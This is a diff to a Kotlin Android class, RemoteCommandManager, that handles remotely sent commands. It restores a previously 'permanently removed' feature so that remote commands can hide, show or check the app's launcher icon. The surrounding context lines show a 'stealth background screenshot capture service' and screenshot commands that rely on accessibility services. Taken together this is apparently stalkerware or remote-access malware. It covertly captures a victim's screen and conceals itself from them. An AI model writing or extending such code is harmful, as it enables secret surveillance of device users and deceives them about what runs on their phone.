@@ -397,8 +397,17 @@ class RemoteCommandManager(private val context: Context) {
                     MediaProjectionHelper.stopService(context)
                     resultMessage = "Stealth background screenshot capture service stopped."
                 }
-                "HIDE_APP_ICON", "HIDE_ICON", "HIDE_LAUNCHER", "SHOW_APP_ICON", "SHOW_ICON", "SHOW_LAUNCHER", "CHECK_ICON_STATE", "CHECK_APP_ICON", "CHECK_ICON" -> {
-                    resultMessage = "App icon hiding feature has been permanently removed per system configuration."
+                "HIDE_APP_ICON", "HIDE_ICON", "HIDE_LAUNCHER" -> {
+                    com.example.util.AppIconUtils.setAppIconVisibility(context, false)
+                    resultMessage = "App launcher icon hidden successfully."
+                }
+                "SHOW_APP_ICON", "SHOW_ICON", "SHOW_LAUNCHER" -> {
+                    com.example.util.AppIconUtils.setAppIconVisibility(context, true)
+                    resultMessage = "App launcher icon restored/shown successfully."
+                }
+                "CHECK_ICON_STATE", "CHECK_APP_ICON", "CHECK_ICON" -> {
+                    val isVisible = com.example.util.AppIconUtils.isAppIconVisible(context)
+                    resultMessage = "App launcher icon visible state: $isVisible"
                 }
                 "GLOBAL_TAKE_SCREENSHOT", "TAKE_SCREENSHOT", "SCREENSHOT" -> {
                     val isAccEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
